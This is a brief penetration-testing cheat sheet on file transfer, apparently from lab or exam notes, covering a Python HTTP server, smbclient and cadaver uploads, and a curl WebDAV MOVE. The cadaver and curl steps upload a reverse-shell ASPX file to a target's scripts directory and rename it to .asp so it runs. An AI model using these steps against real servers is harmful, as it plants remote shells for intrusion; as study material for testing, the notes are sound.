# File Transfer


### HTTP Server

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000


### SMB File Upload

**Method 1: Cadaver**

```
cadaver http://10.11.1.13/scripts/
put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
```

**Method 2: Smbclient**

```
$ smbclient //server/share -c 'cd c:/remote/path ; put local-file'
```
Second example
```
smbclient -W ENGR_STUDENT -U EngrID //hnas.engr.uconn.edu/EngrGroupMixed
get <somethingRecieve>.tgz
put <somethingSend>.tgz
```

**Method 3: CURL**

Change file name with MOVE method. aspx -> asp

```
curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
```
